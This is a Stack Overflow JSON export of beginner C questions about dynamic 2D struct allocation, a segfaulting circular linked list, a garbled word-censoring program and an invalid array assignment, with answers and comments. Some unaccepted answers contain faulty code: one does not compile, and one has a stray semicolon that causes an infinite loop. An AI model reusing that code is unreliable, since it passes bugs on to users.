assign values one by one.</p>\n"}, {"tags": [], "owner": {"reputation": 1129, "user_id": 2477715, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4415aba5097f29d290ed845bb4dd31b?s=128&d=identicon&r=PG", "display_name": "Sohil Omer", "link": "https://stackoverflow.com/users/2477715/sohil-omer"}, "is_accepted": false, "score": 1, "last_activity_date": 1444808199, "last_edit_date": 1444808199, "creation_date": 1444805769, "answer_id": 33118561, "question_id": 33118356, "link": "https://stackoverflow.com/questions/33118356/initialize-a-member-of-two-dimensional-dynamic-struct/33118561#33118561", "title": "Initialize a member of two dimensional dynamic struct", "body": "<p>Use <code>calloc</code> instead of using <code>malloc</code>. </p>\n"}], "owner": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1444808199, "creation_date": 1444805117, "last_edit_date": 1444805585, "question_id": 33118356, "link": "https://stackoverflow.com/questions/33118356/initialize-a-member-of-two-dimensional-dynamic-struct", "title": "Initialize a member of two dimensional dynamic struct", "body": "<p>I am initializing a dynamic 2-dimensional struct in C like this:</p>\n\n<pre><code>typedef struct\n    {\n        int v;\n        unsigned int t;\n    } cb;\n    cb **b;\nb = malloc( sizeof(*b) * s + (s * (e * sizeof(**b) )));\n</code></pre>\n\n<p>s and e are dimensions of the array(row and column size)</p>\n\n<p>How do I also initialize b with v set as 0? </p>\n"}, {"tags": ["c", "linked-list"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1444808975, "post_id": 33118287, "comment_id": 54052378, "body": "&#39;Please let me know what is going wrong&#39; : you are not doing any debugging."}, {"owner": {"reputation": 53, "user_id": 4979059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b910c5cd6b3e6fd7e4c60e099ee73e6b?s=128&d=identicon&r=PG&f=1", "display_name": "the_dark_knight", "link": "https://stackoverflow.com/users/4979059/the-dark-knight"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1444809303, "post_id": 33118287, "comment_id": 54052554, "body": "Yeah! I need to learn to debug. Shall start doing it. Thanks"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1444812962, "post_id": 33118287, "comment_id": 54054694, "body": "If you are interested there is still a full example of <a href=\"http://pastebin.com/BirWtkvb\" rel=\"nofollow noreferrer\"><b>A Singularly Linked Circular Linked List</b></a> that may prove useful."}, {"owner": {"reputation": 53, "user_id": 4979059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b910c5cd6b3e6fd7e4c60e099ee73e6b?s=128&d=identicon&r=PG&f=1", "display_name": "the_dark_knight", "link": "https://stackoverflow.com/users/4979059/the-dark-knight"}, "edited": false, "score": 0, "creation_date": 1444814461, "post_id": 33118287, "comment_id": 54055732, "body": "Yeah sure!Thanks David."}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 4979059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b910c5cd6b3e6fd7e4c60e099ee73e6b?s=128&d=identicon&r=PG&f=1", "display_name": "the_dark_knight", "link": "https://stackoverflow.com/users/4979059/the-dark-knight"}, "edited": false, "score": 0, "creation_date": 1444808027, "post_id": 33118369, "comment_id": 54051774, "body": "Hi Oehm! Thanks for your help."}, {"owner": {"reputation": 843, "user_id": 5052899, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/053cb37a159b38e8e66aff3e5cf0a6e5?s=128&d=identicon&r=PG&f=1", "display_name": "Vinoth", "link": "https://stackoverflow.com/users/5052899/vinoth"}, "edited": false, "score": 0, "creation_date": 1444811311, "post_id": 33118369, "comment_id": 54053656, "body": "@ Sameer If u got the answer means Accept it."}], "tags": [], "owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "is_accepted": false, "score": 1, "last_activity_date": 1444805150, "creation_date": 1444805150, "answer_id": 33118369, "question_id": 33118287, "link": "https://stackoverflow.com/questions/33118287/display-function-in-circular-linked-list-in-c/33118369#33118369", "title": "Display function in Circular Linked List in C", "body": "<p>When you insert the first element into the list, you must its link point to itself:</p>\n\n<pre><code>if (last == NULL) {\n    last = temp;\n    last-&gt;link = last;\n} else ...\n</code></pre>\n\n<p>In your code, the link from the last element was uninitialised.</p>\n"}, {"comments": [{"owner": {"reputation": 53, "user_id": 4979059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b910c5cd6b3e6fd7e4c60e099ee73e6b?s=128&d=identicon&r=PG&f=1", "display_name": "the_dark_knight", "link": "https://stackoverflow.com/users/4979059/the-dark-knight"}, "edited": false, "score": 0, "creation_date": 1444807995, "post_id": 33118469, "comment_id": 54051753, "body": "Hi Jay! Thanks for your help."}, {"owner": {"reputation": 58, "user_id": 5096902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/818960c98cb454cc026e1fb418983e0e?s=128&d=identicon&r=PG&f=1", "display_name": "Jay Dabhi", "link": "https://stackoverflow.com/users/5096902/jay-dabhi"}, "reply_to_user": {"reputation": 53, "user_id": 4979059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b910c5cd6b3e6fd7e4c60e099ee73e6b?s=128&d=identicon&r=PG&f=1", "display_name": "the_dark_knight", "link": "https://stackoverflow.com/users/4979059/the-dark-knight"}, "edited": false, "score": 0, "creation_date": 1444811418, "post_id": 33118469, "comment_id": 54053715, "body": "Sameer_184:Would you increase my point by 1 for your help?and please accept my answer.."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1444812805, "post_id": 33118469, "comment_id": 54054587, "body": "Perhaps if you provided more explanation instead of &quot;Here&#39;s the fixed code&quot; you would stand a better chance..."}, {"owner": {"reputation": 53, "user_id": 4979059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b910c5cd6b3e6fd7e4c60e099ee73e6b?s=128&d=identicon&r=PG&f=1", "display_name": "the_dark_knight", "link": "https://stackoverflow.com/users/4979059/the-dark-knight"}, "edited": false, "score": 0, "creation_date": 1444814412, "post_id": 33118469, "comment_id": 54055697, "body": "Hi Jay! I did upvote but because I am new in here.It doesn&#39;t show up. I need a minimum of 15 points or something."}], "tags": [], "owner": {"reputation": 58, "user_id": 5096902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/818960c98cb454cc026e1fb418983e0e?s=128&d=identicon&r=PG&f=1", "display_name": "Jay Dabhi", "link": "https://stackoverflow.com/users/5096902/jay-dabhi"}, "is_accepted": false, "score": 0, "last_activity_date": 1444813187, "last_edit_date": 1444813187, "creation_date": 1444805461, "answer_id": 33118469, "question_id": 33118287, "link": "https://stackoverflow.com/questions/33118287/display-function-in-circular-linked-list-in-c/33118469#33118469", "title": "Display function in Circular Linked List in C", "body": "<p>Below is corrected code:<br>\none mistake you have done that is at inserting first value you are not pointing the link to first node itself.In circular singly linked list if there is one node then link(next in general) field should be pointed to that node itself.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n    #include&lt;stdlib.h&gt;\n    struct Node\n    {\n        int data;\n        struct Node* link;\n    };\n\n    struct Node* last = NULL;\n\n    void Insert_begin(int a)\n    { \n        struct Node* temp;\n        temp = malloc(sizeof(struct Node));\n        temp-&gt;data = a;\n\n        if (last == NULL)\n        {\n            last = temp;\n\n          /*link field is pointing to that node\n           *it self(you have forgotten this)*/\n            last-&gt;link = temp;\n        }\n        else\n        {\n            temp-&gt;link = last-&gt;link;\n            last-&gt;link = temp;\n        }\n    }\n\n\n\n    void Display()\n    {\n\n        struct Node* temp;\n\n        if (last == NULL)\n        {\n            printf(\"list is empty\");\n        }\n\n        temp = last-&gt;link;\n        while(temp!=last)\n        {\n            printf(\"%d\\n\",temp-&gt;data);\n            temp = temp-&gt;link;\n\n        }\n        printf(\"%d\\n\",temp-&gt;data);\n\n    } \n\n    int main()\n    {\n        Insert_begin(0);\n\n        Insert_begin(1);\n        Insert_begin(2);\n        Insert_begin(3);\n        Insert_begin(4);\n        Display();\n        return 0;\n    }\n</code></pre>\n\n<p>*</p>\n"}, {"comments": [{"owner": {"reputation": 53, "user_id": 4979059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b910c5cd6b3e6fd7e4c60e099ee73e6b?s=128&d=identicon&r=PG&f=1", "display_name": "the_dark_knight", "link": "https://stackoverflow.com/users/4979059/the-dark-knight"}, "edited": false, "score": 0, "creation_date": 1444807962, "post_id": 33118514, "comment_id": 54051734, "body": "Hi Sohil! Thanks for your help."}], "tags": [], "owner": {"reputation": 1129, "user_id": 2477715, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4415aba5097f29d290ed845bb4dd31b?s=128&d=identicon&r=PG", "display_name": "Sohil Omer", "link": "https://stackoverflow.com/users/2477715/sohil-omer"}, "is_accepted": false, "score": 0, "last_activity_date": 1444805622, "creation_date": 1444805622, "answer_id": 33118514, "question_id": 33118287, "link": "https://stackoverflow.com/questions/33118287/display-function-in-circular-linked-list-in-c/33118514#33118514", "title": "Display function in Circular Linked List in C", "body": "<pre><code>             if (last == NULL)\n               {\n                last = temp;\n                **// adding this line \n                last-&gt;link = last;**\n               }\n</code></pre>\n\n<p>That solve the problem </p>\n"}, {"comments": [{"owner": {"reputation": 53, "user_id": 4979059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b910c5cd6b3e6fd7e4c60e099ee73e6b?s=128&d=identicon&r=PG&f=1", "display_name": "the_dark_knight", "link": "https://stackoverflow.com/users/4979059/the-dark-knight"}, "edited": false, "score": 0, "creation_date": 1444808257, "post_id": 33119340, "comment_id": 54051932, "body": "Hi lucifer!Thanks for your help."}], "tags": [], "owner": {"reputation": 165, "user_id": 5400801, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ce7ff8454f1dcf49ff366d419215a9e8?s=128&d=identicon&r=PG&f=1", "display_name": "lucifer", "link": "https://stackoverflow.com/users/5400801/lucifer"}, "is_accepted": false, "score": 1, "last_activity_date": 1444808381, "last_edit_date": 1444808381, "creation_date": 1444808200, "answer_id": 33119340, "question_id": 33118287, "link": "https://stackoverflow.com/questions/33118287/display-function-in-circular-linked-list-in-c/33119340#33119340", "title": "Display function in Circular Linked List in C", "body": "<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nstruct Node\n{\n        int data;\n        struct Node* link;\n};\n\nstruct Node* last = NULL;\n\nvoid Insert_begin(int a)\n{\n        struct Node* temp;\n        temp = malloc(sizeof(struct Node));\n        temp-&gt;data = a;\n\n        if (last == NULL)\n        {\n                last = temp;\n                temp-&gt;link=last;//you forget this\n        }\n        else\n        {\n                temp-&gt;link = last-&gt;link;\n                last-&gt;link = temp;\n                last=temp;\n        }\n}\n\n\n\nvoid Display()\n{\n\n        struct Node* temp;\n\n        if (last == NULL)\n        {\n                printf(\"list is empty\");\n                return;\n        }\n\n        temp = last-&gt;link;\n        while(temp!=last)\n        {\n                printf(\"%d\\n\",temp-&gt;data);\n                temp = temp-&gt;link;\n\n        }\n        printf(\"%d\\n\",temp-&gt;data);\n\n}\n\nint main()\n{\n        Insert_begin(0);\n\n        Insert_begin(1);\n        Insert_begin(2);\n        Insert_begin(3);\n        Insert_begin(4);\n        Display();\n        return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 59, "user_id": 5638040, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/928fd526ad4e530382c6e110198661c4?s=128&d=identicon&r=PG&f=1", "display_name": "Sudhir Bhagat", "link": "https://stackoverflow.com/users/5638040/sudhir-bhagat"}, "is_accepted": false, "score": 0, "last_activity_date": 1552364299, "last_edit_date": 1552364299, "creation_date": 1531482767, "answer_id": 51324498, "question_id": 33118287, "link": "https://stackoverflow.com/questions/33118287/display-function-in-circular-linked-list-in-c/51324498#51324498", "title": "Display function in Circular Linked List in C", "body": "<p>Problem is with Insert_begin(int a) function,\nWhen you are inserting first node, you are not linking his next to itself, so next time while inserting second/third/.. node, you trying to access first node as last->link but it gives you garbage value and that is reason </p>\n\n<pre><code>void Insert_begin(int a)\n { \n               struct Node* temp;\n               temp = malloc(sizeof(struct Node));\n               temp-&gt;data = a;    \n               if (last == NULL)\n               {\n                 last = temp;\n                 last-&gt;link = last;\n               }\n               else\n               {\n                temp-&gt;link = last-&gt;link;\n                last-&gt;link = temp;\n                last = temp;\n               }\n }\n\nvoid Display()\n  {   \n               struct Node* temp;    \n               if (last == NULL)\n               {\n                 printf(\"list is empty\");\n               }    \n              else\n               {    \n                    temp = last-&gt;link;\n                    while(temp!=last);\n                    {\n                           printf(\"%d\\n\",temp-&gt;data);\n                           temp = temp-&gt;link;     \n                    } \n                    printf(\"%d\\n\",temp-&gt;data); \n               }  \n  }\n  void main()\n  {\n      Insert_begin(10);\n      Insert_begin(20);\n      Insert_begin(30);\n      Display();\n    }\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 4979059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b910c5cd6b3e6fd7e4c60e099ee73e6b?s=128&d=identicon&r=PG&f=1", "display_name": "the_dark_knight", "link": "https://stackoverflow.com/users/4979059/the-dark-knight"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3891, "favorite_count": 0, "answer_count": 5, "score": 0, "last_activity_date": 1552364299, "creation_date": 1444804839, "last_edit_date": 1444806835, "question_id": 33118287, "link": "https://stackoverflow.com/questions/33118287/display-function-in-circular-linked-list-in-c", "title": "Display function in Circular Linked List in C", "body": "<p>I am having a problem with my Circular Linked list. I believe the problem is with my display function. Please let me know what is going wrong. The problem I have is that the first n-1 elements are displayed and then I get a segmentation fault(The last element doesn't get displayed and I get a segmentation fault).Thank you :-)</p>\n\n<pre><code>             #include&lt;stdio.h&gt;\n             #include&lt;stdlib.h&gt;\n             struct Node\n             {\n              int data;\n              struct Node* link;\n             };\n             struct Node* last = NULL;\n             void Insert_begin(int a)\n             { \n               struct Node* temp;\n               temp = malloc(sizeof(struct Node));\n               temp-&gt;data = a;    \n               if (last == NULL)\n                 last = temp;\n               else\n               {\n                temp-&gt;link = last-&gt;link;\n                last-&gt;link = temp;\n               }\n             }\n             void Display()\n             {   \n               struct Node* temp;    \n               if (last == NULL)\n               {\n                 printf(\"list is empty\");\n               }        \n               temp = last-&gt;link;\n               while(temp!=last)\n               {\n                 printf(\"%d\\n\",temp-&gt;data);\n                 temp = temp-&gt;link;     \n               }\n               printf(\"%d\\n\",temp-&gt;data);   \n             }  \n             int main()\n             {\n              Insert_begin(0);               \n              Insert_begin(1);\n              Insert_begin(2);\n              Insert_begin(3);\n              Insert_begin(4);\n              Display();\n              return 0;\n             }\n</code></pre>\n"}, {"tags": ["c", "arrays", "string", "stdio"], "comments": [{"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1444805001, "post_id": 33118194, "comment_id": 54050078, "body": "Your .txt file is definately in Ascii format, right?"}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 1, "creation_date": 1444805149, "post_id": 33118194, "comment_id": 54050145, "body": "<code>buffer[i]</code> isn&#39;t NUL-terminated. Try changing <code>char buffer[SIZE][SIZE];</code> to <code>char buffer[SIZE][SIZE] = {&#39;\\0&#39;};</code>"}, {"owner": {"reputation": 3311, "user_id": 3405387, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/VYA2r.png?s=128&g=1", "display_name": "Lukas", "link": "https://stackoverflow.com/users/3405387/lukas"}, "edited": false, "score": 0, "creation_date": 1444810018, "post_id": 33118194, "comment_id": 54052957, "body": "Can I ask what output you expect? that&#39;ll help understand what exactly you intend to do and there might be easier ways to do it"}], "answers": [{"comments": [{"owner": {"reputation": 338, "user_id": 5439654, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7m1uW.png?s=128&g=1", "display_name": "Kotshi", "link": "https://stackoverflow.com/users/5439654/kotshi"}, "reply_to_user": {"reputation": 303, "user_id": 5443707, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/e4b3cca2a028c2c12da3d669d9935d7c?s=128&d=identicon&r=PG&f=1", "display_name": "noobcoder", "link": "https://stackoverflow.com/users/5443707/noobcoder"}, "edited": false, "score": 0, "creation_date": 1444812509, "post_id": 33119709, "comment_id": 54054367, "body": "@noobcoder If your code works well, don&#39;t forget to accept the answer."}], "tags": [], "owner": {"reputation": 338, "user_id": 5439654, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7m1uW.png?s=128&g=1", "display_name": "Kotshi", "link": "https://stackoverflow.com/users/5439654/kotshi"}, "is_accepted": true, "score": 2, "last_activity_date": 1444809340, "creation_date": 1444809340, "answer_id": 33119709, "question_id": 33118194, "link": "https://stackoverflow.com/questions/33118194/garbled-string-output/33119709#33119709", "title": "Garbled string output", "body": "<p>I have good and bad news, the bad one is: I found a few errors and mistake.\nThe good one is: all of these are common for a beginner!</p>\n\n<p>First one: The strings in <code>buffer[]</code> aren't terminated with a <code>'\\0'</code> which is the end of string indicator. This is the one cause of your problem.\nAnd here are the other ones:</p>\n\n<ul>\n<li>char buffer[SIZE][SIZE];\nHere you are considering that number of words and word's length can't be longer that 128 which will cause Segmentation Fault whenever this condition is wrong. I suggest you learn about dynamic allocation (malloc()).</li>\n<li>for(j=1; j &lt; argc; j++) If argc == 1, you won't enter this loop which would result in <code>newstr</code> being empty. Usually we end arrays with a NULL pointer and then check for every string of the array being non-null while reading the array so that we won't try to use undefined content.</li>\n<li>As you pointed at, your code is quite messy, next time, try separating your code in functions and not coding in <code>main()</code>.</li>\n<li>Try reducing this, the fewer lines your write, the easier your code is to read and debug:</li>\n</ul>\n\n<p><code>j = 0;\n            i++;\n            buffer[i][j]=x;//this should be buffer[i][j]\n            printf(\"tracing: buffer[%d][%d]: %c\\n\", i,j, buffer[i][j]);\n            j = 0;\n            i++;</code></p>\n\n<ul>\n<li>This advice isn't really relevant for that kind of program designed to read a lot of data but remember: try to avoid storing data whenever you can.</li>\n</ul>\n\n<p>I think this is enough for now, I wish you good luck and to apologize for my poor English.</p>\n"}], "owner": {"reputation": 303, "user_id": 5443707, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/e4b3cca2a028c2c12da3d669d9935d7c?s=128&d=identicon&r=PG&f=1", "display_name": "noobcoder", "link": "https://stackoverflow.com/users/5443707/noobcoder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 611, "favorite_count": 0, "accepted_answer_id": 33119709, "answer_count": 1, "score": 1, "last_activity_date": 1444809340, "creation_date": 1444804433, "last_edit_date": 1444805387, "question_id": 33118194, "link": "https://stackoverflow.com/questions/33118194/garbled-string-output", "title": "Garbled string output", "body": "<p>I'm currently working on an assignment which asks me to censor words of argv and input redirection. </p>\n\n<p>My problem is obvious in my output which can be found below. I have a lot of tracing print statements which may or may not help you point out my issue.</p>\n\n<p>My intention is:</p>\n\n<ol>\n<li>Get <code>file.txt</code></li>\n<li>Copy contents of <code>file.txt</code> into <code>buffer[x][y]</code>, where <code>[x]</code> is a string of word and <code>[y]</code> is a char of <code>[x]</code>.</li>\n<li>Compare <code>argv[]</code> arguments to <code>buffer[][]</code>.</li>\n<li>Create <code>newstr[size2]</code>. For every <code>argv[]</code> arguement found in <code>buffer[][]</code>, replace it with <code>replace[9] = \"CENSORED\"</code>.</li>\n<li>Print the string of <code>newstr[0 to (size2-1)]</code>.</li>\n</ol>\n\n<p>Here is my code:</p>\n\n<pre><code>// censored.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\n#define SIZE 128\n\nint main ( int argc, char* argv[])\n{\n    int i = 0;\n    int j = 0;\n    int k = 0;\n    char buffer[SIZE][SIZE];\n    char x;\n    int count = 0;\n    int size1 = sizeof(buffer);\n    int size2 = 0;\n    char replace[9] = \"CENSORED\";\n    int buffersize=0;\n    printf(\"tracing: size1: %d.\\n\", size1);\n    printf(\"tracing: argc: %d.\\n\", argc);\n    while((fscanf(stdin, \"%c\", &amp;x)!=EOF))\n    {\n        if(isalpha(x))\n        {\n            buffer[i][j]=x;\n            printf(\"tracing: buffer[%d][%d]: %c\\n\", i,j, buffer[i][j]);\n            j++;\n        }\n        else if(isspace(x)) // if whitespace\n        {\n            j = 0;\n            i++;\n            buffer[i][j]=x;//this should be buffer[i][j]\n            printf(\"tracing: buffer[%d][%d]: %c\\n\", i,j, buffer[i][j]);\n            j = 0;\n            i++;\n        }\n        else if(ispunct(x)) // if x is a punctuation\n        {\n            j = 0;\n            i++;\n            buffer[i][j]=x;//this should be buffer[i][j]\n            printf(\"tracing: buffer[%d][%d]: %c\\n\", i,j, buffer[i][j]);\n        }\n        else if(iscntrl(x)) // if control key (\\n, \\r etc...)\n        {\n            j = 0;\n            i++;\n            buffer[i][j]=x;//this should be buffer[i][j]\n            printf(\"tracing: buffer[%d][%d]: %c\", i,j, buffer[i][j]);\n            j = 0;\n            i++;\n        }\n        else if(isdigit(x))\n        {\n            buffer[i][j]=x;//this should be buffer[i][j]\n            printf(\"tracing: buffer[%d][%d]: %c\\n\", i,j, buffer[i][j]);\n            j++;\n        }\n        else\n        {\n            break;\n        }\n    }\n    size2 = i;\n    printf(\"tracing: buffer[8][0]:%s\\n\",buffer[8]);\n    char newstr[size2][SIZE];\n    i = 0;\n    j = 0;\n//  tracing:\n    printf(\"tracing: line 72\\n\");\n    printf(\"tracing: size2: %d.\\n\", size2);\n    while(i &lt; size2) //print buffer[]\n    {\n        printf(\"%s\", buffer[i]);\n        i++;\n    }\n\n    printf(\"tracing: line 80\\n\");\n    for(k=1; k &lt; argc; k++)\n    {\n        printf(\"%s\\n\", argv[k]);\n    }\n//  end tracing\n    i = 0; //reinitialize i\n    j = 0; //reinitialize j\n//  creating newstr[SIZE] and censoring words\n    printf(\"tracing: line 89\\n\");\n    for(i = 0; i &lt; size2; i++)\n    {\n        for(j=1; j &lt; argc; j++)\n        {\n            if(strcmp(buffer[i], argv[j])==0)\n            {\n                strcpy(newstr[i], &amp;replace[0]);\n                printf(\"tracing: replaced at [%d]\\n\", i);\n                break;\n            }\n            else\n            {\n                strcpy(newstr[i], buffer[i]);\n                printf(\"tracing: copied at [%d]\\n\", i);\n            }\n        }\n    }\n    i = 0; //reinitialize i\n    while(i &lt; size2)\n    {\n        printf(\"%s\", newstr[i]);\n        i++;\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Assuming I have input redirection file named <code>file.txt</code> and its contents:</p>\n\n<pre><code>Said Hamlet to Ophelia,\nI'll draw a sketch of thee,\nWhat kind of pencil shall I use?\n2B or not 2B?\n</code></pre>\n\n<p>my input is:</p>\n\n<pre><code>./censored Ophelia thee 2B &lt; file.txt\n</code></pre>\n\n<p>this is the weird output I got:</p>\n\n<pre><code>Said Hamlet to CENSORED, Ill draw a sketch ???)ofoQ? ?\"h?CENSORED,2oQ?\nWhat? /oQ?kind? of 6oQ?pencil +oQ?shall ?\"h?I-oQ? ???)use? ???2BoQ?\n7oQoroQ Qnot 1oQ?CENSORED?4oQ?\n</code></pre>\n\n<p>Any help is appreciated, I know my code is messy, this is my first semester learning C. </p>\n"}, {"tags": ["c"], "answers": [{"tags": [], "owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "is_accepted": true, "score": 3, "last_activity_date": 1444804763, "creation_date": 1444804763, "answer_id": 33118270, "question_id": 33118140, "link": "https://stackoverflow.com/questions/33118140/invalid-array-assignment/33118270#33118270", "title": "Invalid Array Assignment", "body": "<p>You can't copy an array using <code>=</code>. Neither can you assign an array's address; <code>x = y;</code> doesn't work either when <code>x</code> and <code>y</code> have types <code>char[1]</code> for example. To copy the contents of <code>b</code> to <code>a[2]</code>, use <a href=\"http://man7.org/linux/man-pages/man3/memcpy.3.html\" rel=\"nofollow\"><code>memcpy</code></a>:</p>\n\n<pre><code>memcpy(a[2], b, sizeof(a[2]));\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 147, "user_id": 5388419, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-9AP2x_r2rlg/AAAAAAAAAAI/AAAAAAAAACE/lImaY8j5u6c/photo.jpg?sz=128", "display_name": "Newaz Hossain", "link": "https://stackoverflow.com/users/5388419/newaz-hossain"}, "is_accepted": false, "score": 0, "last_activity_date": 1444805018, "creation_date": 1444805018, "answer_id": 33118341, "question_id": 33118140, "link": "https://stackoverflow.com/questions/33118140/invalid-array-assignment/33118341#33118341", "title": "Invalid Array Assignment", "body": "<p>This assignment is not possible.Array allow specific location  assignment.\nyou can try like this:</p>\n\n<pre><code>int main()\n{\n    int a[3][2];\n    int b[2]={0,1};\n    a[0][0]=b[0];\n    a[0][1]=b[1];\n    return 0;\n} \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2966, "user_id": 3462681, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4739059ffcecfbd166bbaf9be7549237?s=128&d=identicon&r=PG&f=1", "display_name": "Roushan", "link": "https://stackoverflow.com/users/3462681/roushan"}, "is_accepted": false, "score": 2, "last_activity_date": 1444805148, "creation_date": 1444805148, "answer_id": 33118366, "question_id": 33118140, "link": "https://stackoverflow.com/questions/33118140/invalid-array-assignment/33118366#33118366", "title": "Invalid Array Assignment", "body": "<p>you should iterate each element of <code>b[2]</code> one by one and store into it <code>a[2]</code>\ntry this:</p>\n\n<pre><code>int main()\n{\n    int a[3][2];\n    int b[2]={0,1};\n    for(int i=0;i&lt;2;i++){\n     b[i]=a[2];\n    return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 25, "user_id": 5443428, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a9c6d975565e4a3b712f100ff53cde?s=128&d=identicon&r=PG&f=1", "display_name": "Zjh", "link": "https://stackoverflow.com/users/5443428/zjh"}, "edited": false, "score": 0, "creation_date": 1444805343, "post_id": 33118393, "comment_id": 54050249, "body": "oh, you can use memcpy"}], "tags": [], "owner": {"reputation": 25, "user_id": 5443428, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a9c6d975565e4a3b712f100ff53cde?s=128&d=identicon&r=PG&f=1", "display_name": "Zjh", "link": "https://stackoverflow.com/users/5443428/zjh"}, "is_accepted": false, "score": 2, "last_activity_date": 1444805228, "creation_date": 1444805228, "answer_id": 33118393, "question_id": 33118140, "link": "https://stackoverflow.com/questions/33118140/invalid-array-assignment/33118393#33118393", "title": "Invalid Array Assignment", "body": "<p>Because the standard says so. Arrays cannot be assigned, only initialized.\nso \nC: </p>\n\n<pre><code>int i;\nfor(i = 0; i &lt; 2; i++)\n{\n  a[2][i] = b[i];\n}\n...\n</code></pre>\n\n<p>C++: you can use strcpy!</p>\n"}], "owner": {"reputation": 33, "user_id": 5443676, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af1d905cb4336d853835106f475298af?s=128&d=identicon&r=PG&f=1", "display_name": "Rohit Mangla", "link": "https://stackoverflow.com/users/5443676/rohit-mangla"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 12586, "favorite_count": 1, "accepted_answer_id": 33118270, "answer_count": 4, "score": 3, "last_activity_date": 1444805228, "creation_date": 1444804282, "last_edit_date": 1444804340, "question_id": 33118140, "link": "https://stackoverflow.com/questions/33118140/invalid-array-assignment", "title": "Invalid Array Assignment", "body": "<p>i don't know where is the problem i'm assigning the address to other 2 dimensional array. Please help me to fix this problem</p>\n\n<pre><code>int main()\n{\n    int a[3][2];\n    int b[2]={0,1};\n    a[2]=b;\n    return 0;\n}\n</code></pre>\n\n<p><code>prog.cpp:8:9: error: invalid array assignment</code></p>\n"}]